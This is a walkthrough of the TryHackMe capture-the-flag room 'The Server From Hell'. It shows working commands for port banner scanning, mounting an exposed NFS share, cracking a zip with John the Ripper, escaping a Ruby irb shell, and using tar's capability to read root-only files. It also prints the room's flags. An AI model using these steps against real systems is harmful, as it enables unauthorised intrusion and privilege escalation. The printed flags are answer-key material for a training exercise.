# The Server From Hell

Face a server that feels as if it was configured and deployed by Satan himself. Can you escalate to root?

[The Server From Hell](https://tryhackme.com/room/theserverfromhell)

## Topic's

- Port Poking
- Bash Scripting (Port Scanning)
- NFS Enumeration
- NFS Exploitation
- Brute Forcing (Zip)
- Escape Ruby Shell
- Capabilities (Tar)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Hacking the server

Start at port 1337 and enumerate your way.

Good luck.

```
kali@kali:~/CTFs/tryhackme/The Server From Hell$ telnet 10.10.13.91 1337
Trying 10.10.13.91...
Connected to 10.10.13.91.
Escape character is '^]'.
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the portsConnection closed by foreign host.
kali@kali:~/CTFs/tryhackme/The Server From Hell$
```

```bash
for i in {1..100}; do (sleep 1; echo "get /") | telnet 10.10.13.91 $i | grep 550 >> x ; done
```

```
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff00
550 12345 0fffffffffff8000000000000000008888887cfcfffffffffffff00
550 12345 0ffffffff000000888000000000800000080000008800007fffff00
550 12345 0fffffff8000000000008888000000000080000000000007fffff00
550 12345 0ffffff70000000008cffffffc0000000080000000000008fffff00
550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff00
550 12345 0fff78000878000077800887fc8f80007fffc7778800000880cff00
550 12345 0ff70008fc77f7000000f80008f8000007f0000000000000888ff00
550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf00
550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00
550 12345 0f8008c008fff8000000000000780000007f800087708000800ff00
550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff00
550 12345 0f7000f888f8007ff7800000770877800000cf780000ff00807ff00
550 12345 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00
550 12345 0ff70800008ff800f007fff70880000087f70000007fcf7007fff00
550 12345 0fff70000007fffcf700008ffc778000078000087ff87f700ffff00
550 12345 0ffffc000000f80fff700007787cfffc7787fffff0788f708ffff00
550 12345 0fffff7000008f00fffff78f800008f887ff880770778f708ffff00
550 12345 0ffffff8000007f0780cffff700000c000870008f07fff707ffff00
550 12345 0ffffcf7000000cfc00008fffff777f7777f777fffffff707ffff00
550 12345 0cccccff0000000ff000008c8cffffffffffffffffffff807ffff00
550 12345 0fffffff70000000ff8000c700087fffffffffffffffcf808ffff00
550 12345 0ffffffff800000007f708f000000c0888ff78f78f777c008ffff00
550 12345 0fffffffff800000008fff7000008f0000f808f0870cf7008ffff00
550 12345 0ffffffffff7088808008fff80008f0008c00770f78ff0008ffff00
550 12345 0fffffffffffc8088888008cffffff7887f87ffffff800000ffff00
550 12345 0fffffffffffff7088888800008777ccf77fc777800000000ffff00
550 12345 0fffffffffffffff800888880000000000000000000800800cfff00
550 12345 0fffffffffffffffff70008878800000000000008878008007fff00
550 12345 0fffffffffffffffffff700008888800000000088000080007fff00
550 12345 0fffffffffffffffffffffc800000000000000000088800007fff00
550 12345 0fffffffffffffffffffffff7800000000000008888000008ffff00
550 12345 0fffffffffffffffffffffffff7878000000000000000000cffff00
550 12345 0ffffffffffffffffffffffffffffffc880000000000008ffffff00
550 12345 0ffffffffffffffffffffffffffffffffff7788888887ffffffff00
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
```

`go to port 12345`

```
kali@kali:~/CTFs/tryhackme/The Server From Hell$ telnet 10.10.13.91 12345
Trying 10.10.13.91...
Connected to 10.10.13.91.
Escape character is '^]'.
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scanConnection closed by foreign host.
kali@kali:~/CTFs/tryhackme/The Server From Hell$
```

```
kali@kali:~/CTFs/tryhackme/The Server From Hell$ showmount -e 10.10.13.91
Export list for 10.10.13.91:
/home/nfs *
kali@kali:~/CTFs/tryhackme/The Server From Hell$ mkdir /tmp/hell
kali@kali:~/CTFs/tryhackme/The Server From Hell$ sudo mount -t nfs 10.10.13.91:/home/nfs /tmp/hell
[sudo] password for kali:
kali@kali:~/CTFs/tryhackme/The Server From Hell$ ls -la /tmp/hell
total 32
drwxr-xr-x  2 nobody nogroup  4096 Sep 16 00:11 .
drwxrwxrwt 19 root   root    20480 Nov 14 16:53 ..
-rw-r--r--  1 root   root     4534 Sep 16 00:11 backup.zip
```

```
kali@kali:~/CTFs/tryhackme/The Server From Hell$ cd /tmp/hell
kali@kali:/tmp/hell$ ls -la
total 32
drwxr-xr-x  2 nobody nogroup  4096 Sep 16 00:11 .
drwxrwxrwt 19 root   root    20480 Nov 14 16:55 ..
-rw-r--r--  1 root   root     4534 Sep 16 00:11 backup.zip
kali@kali:/tmp/hell$ unzip backup.zip
Archive:  backup.zip
checkdir error:  cannot create home
                 Read-only file system
                 unable to process home/hades/.ssh/.
[backup.zip] home/hades/.ssh/id_rsa password:
   skipping: home/hades/.ssh/id_rsa  incorrect password
   skipping: home/hades/.ssh/hint.txt  incorrect password
   skipping: home/hades/.ssh/authorized_keys  incorrect password
   skipping: home/hades/.ssh/flag.txt  incorrect password
   skipping: home/hades/.ssh/id_rsa.pub  incorrect password

kali@kali:~/CTFs/tryhackme/The Server From Hell$ zip2john backup.zip > /home/kali/CTFs/tryhackme/The\ Server\ From\ Hell/backup.hash
backup.zip/home/hades/.ssh/ is not encrypted!
ver 1.0 backup.zip/home/hades/.ssh/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=2107, decmplen=3369, crc=6F72D66B
ver 1.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/hint.txt PKZIP Encr: 2b chk, TS_chk, cmplen=22, decmplen=10, crc=F51A7381
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/authorized_keys PKZIP Encr: 2b chk, TS_chk, cmplen=602, decmplen=736, crc=1C4C509B
ver 1.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=45, decmplen=33, crc=2F9682FA
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/id_rsa.pub PKZIP Encr: 2b chk, TS_chk, cmplen=602, decmplen=736, crc=1C4C509B
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

kali@kali:~/CTFs/tryhackme/The Server From Hell$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
zxcvbnm          (backup.zip)
1g 0:00:00:00 DONE (2020-11-14 17:00) 12.50g/s 102400p/s 102400c/s 102400C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed
kali@kali:~/CTFs/tryhackme/The Server From Hell$ unzip backup.zip
Archive:  backup.zip
   creating: home/hades/.ssh/
[backup.zip] home/hades/.ssh/id_rsa password:
  inflating: home/hades/.ssh/id_rsa
 extracting: home/hades/.ssh/hint.txt
  inflating: home/hades/.ssh/authorized_keys
 extracting: home/hades/.ssh/flag.txt
  inflating: home/hades/.ssh/id_rsa.pub
```

```
kali@kali:~/CTFs/tryhackme/The Server From Hell$ cat home/hades/.ssh/flag.txt
thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}
```

```
kali@kali:~/CTFs/tryhackme/The Server From Hell$ cat home/hades/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC++lgUyjrUH1b6Hm5ZR2j6OqP1GMWJpDgm8Z4sj0q2XxoFnE+eA3J3lUMUSyUV+BthSFiA2ZTbFNpY8rQfB67Jq4iLNXhAsD0oS9UwDP7ZbzKFxKtQOlTR+iyiUYflOZDEFL01P+bPBKOyTB6gxsLP2YpD1mXj1GaoaDylkjcWhpLBPAPz7KwSgXVEpM2LoAE0Yer/TSpp2Ywu0zYqAV0k2LpLp9WOnDC+VWEK9x2pigeOnNf3g+hCnOpiVuLmGq89Ub9WPt5YEMfMvqRqnHfYixI1+pPusV835q0w/f+h8kSiOeAFviC8SgBne3MHTwR7png5O2VsUDzzjStBc5PDFcCp28V07beTe4Ftf8QwNXX1mQHPf5H8kaWvJYJ/hsIGbBLE1m5+LVpCaogxWaycGrQMo9iqr2POIepSoW9kzEdHVWMJgCerzdUqkOgj0mX0qC8rMc5m2uJCpPL0wzr+l6E0ZQggKXdETDi/kKrQcM8dVzmR8vfu2ndXFxfkLnOjEiLqMqRK9caNF+1wr2kZ0tEKS1xamh4VfG+8JdPVsCu6DPvQt9o/c16otOzRxqBGR3ao4UfL9kscyCrC26EcTRp1P4JEuTmm4ZDTXQvgU4TSKLmIl9h6eBWrLhgey0pAmKCD+N/87lT4unwciGh1JvTc+6nosT1wX9mzfGvktQ== hades@hell
kali@kali:~/CTFs/tryhackme/The Server From Hell$ chmod 600 home/hades/.ssh/id_rsa
kali@kali:~/CTFs/tryhackme/The Server From Hell$ ssh -i home/hades/.ssh/id_rsa hades@10.10.13.91
kex_exchange_identification: read: Connection reset by peer
```

```
kali@kali:~/CTFs/tryhackme/The Server From Hell$ cat home/hades/.ssh/hint.txt
2500-4500

for i in {2500..4500}; do ssh -i home/hades/.ssh/id_rsa hades@10.10.13.91 -p $i ; done
for i in {4500..1500}; do ssh -i home/hades/.ssh/id_rsa hades@10.10.13.91 -p $i ; done

while true ; do ssh -i home/hades/.ssh/id_rsa hades@10.10.13.91 -p `shuf -i 2500-4500 -n 1` ; done
```

```
The authenticity of host '[10.10.13.91]:3333 ([10.10.13.91]:3333)' can't be established.
ECDSA key fingerprint is SHA256:xT5f2qKwN5vWrUVIEkkL92j1vcb/XjF9tIHoW/vyyx8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.13.91]:3333' (ECDSA) to the list of known hosts.
Connection closed by 10.10.13.91 port 3333

kali@kali:~/CTFs/tryhackme/The Server From Hell$ ssh -i home/hades/.ssh/id_rsa hades@10.10.13.91 -p 3333

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


 ██░ ██ ▓█████  ██▓     ██▓
▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒
▒██▀▀██░▒███   ▒██░    ▒██░
░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░
░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░   ░     ░ ░     ░ ░
 ░  ░  ░   ░  ░    ░  ░    ░  ░

 Welcome to hell. We hope you enjoy your stay!


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


 ██░ ██ ▓█████  ██▓     ██▓
▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒
▒██▀▀██░▒███   ▒██░    ▒██░
░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░
░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░   ░     ░ ░     ░ ░
 ░  ░  ░   ░  ░    ░  ░    ░  ░

 Welcome to hell. We hope you enjoy your stay!
 irb(main):001:0>
```

[https://wiki.ruby-portal.de/IRB.html](https://wiki.ruby-portal.de/IRB.html)

```
kali@kali:~/CTFs/tryhackme/The Server From Hell$ ssh -i home/hades/.ssh/id_rsa hades@10.10.13.91 -p 3333

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


 ██░ ██ ▓█████  ██▓     ██▓
▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒
▒██▀▀██░▒███   ▒██░    ▒██░
░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░
░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░   ░     ░ ░     ░ ░
 ░  ░  ░   ░  ░    ░  ░    ░  ░

 Welcome to hell. We hope you enjoy your stay!


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat Nov 14 16:28:31 2020 from 10.8.106.222

 ██░ ██ ▓█████  ██▓     ██▓
▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒
▒██▀▀██░▒███   ▒██░    ▒██░
░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░
░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░   ░     ░ ░     ░ ░
 ░  ░  ░   ░  ░    ░  ░    ░  ░

 Welcome to hell. We hope you enjoy your stay!
 irb(main):001:0> system("/bin/bash")
hades@hell:~$
```

```
hades@hell:~$ ls -la
total 28
drwxr-xr-x 3 root  root  4096 Sep 15 22:11 .
drwxr-xr-x 6 root  root  4096 Sep 15 22:11 ..
-rw-r--r-- 1 hades hades  220 Sep 15 22:11 .bash_logout
-rw-r--r-- 1 hades hades 3771 Sep 15 22:11 .bashrc
-rw-r--r-- 1 hades hades  807 Sep 15 22:11 .profile
drwx------ 2 hades hades 4096 Sep 15 22:11 .ssh
-rw-r--r-- 1 hades hades   30 Sep 15 22:11 user.txt
hades@hell:~$ cat user.txt
thm{sh3ll_3c4p3_15_v3ry_1337}
```

```
hades@hell:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep
hades@hell:~$ cd /tmp
hades@hell:/tmp$ tar -cvf root.tar /root/root.txt
tar: Removing leading `/' from member names
/root/root.txt
hades@hell:/tmp$ ls -la
total 48
drwxrwxrwt  9 root  root   4096 Nov 14 16:48 .
drwxr-xr-x 24 root  root   4096 Nov 14 15:39 ..
drwxrwxrwt  2 root  root   4096 Nov 14 15:38 .ICE-unix
drwxrwxrwt  2 root  root   4096 Nov 14 15:38 .Test-unix
drwxrwxrwt  2 root  root   4096 Nov 14 15:38 .X11-unix
drwxrwxrwt  2 root  root   4096 Nov 14 15:38 .XIM-unix
drwxrwxrwt  2 root  root   4096 Nov 14 15:38 .font-unix
-rw-rw-r--  1 hades hades 10240 Nov 14 16:48 root.tar
drwx------  3 root  root   4096 Nov 14 15:39 systemd-private-130869960cd840d996b83870e33cb35e-systemd-resolved.service-0RiHwv
drwx------  3 root  root   4096 Nov 14 15:38 systemd-private-130869960cd840d996b83870e33cb35e-systemd-timesyncd.service-3vAU2N
hades@hell:/tmp$ tar -xvf root.tar
root/root.txt
hades@hell:/tmp$ cat root/root.txt
thm{w0w_n1c3_3sc4l4t10n}
```

flag.txt

`thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}`

user.txt

`thm{sh3ll_3c4p3_15_v3ry_1337}`

root.txt

`thm{w0w_n1c3_3sc4l4t10n}`
